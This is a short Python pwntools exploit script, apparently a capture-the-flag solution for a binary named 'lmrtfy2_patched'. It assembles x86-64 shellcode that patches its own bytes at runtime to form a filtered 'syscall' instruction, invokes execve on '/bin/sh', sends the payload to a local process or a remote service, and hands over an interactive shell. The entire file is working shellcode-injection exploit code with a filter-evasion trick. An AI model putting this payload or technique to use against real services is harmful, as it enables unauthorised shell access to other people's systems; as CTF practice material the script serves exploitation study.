#!/usr/bin/env python3

from pwn import *

exe = ELF("lmrtfy2_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    print(r.pid)
    input()

    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())

    assembly = """
                xor rdi, rdi
                xor rsi, rsi
                xor rdx, rdx
                add rbx, {}
                inc byte PTR [rbx]
                add rbx, 0x1
                inc byte PTR [rbx]
                add rbx, 0x1
                mov rdi, rbx
                mov rax, 0x3b
               """

    syscall = asm('syscall')
    nop = asm('nop')

    placeholder = 0xff

    shellcode = asm(assembly.format(placeholder))
    offset = len(assembly)

    print(len(shellcode))
    print('syscall len: ' + str(len(syscall)))

    shellcode = asm(assembly.format(offset))
    print(len(shellcode))
    a = bytes([syscall[0]-1, syscall[1]-1])
    shellcode += a
    shellcode += b'/bin/sh\x00'

    r.sendline(shellcode)    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
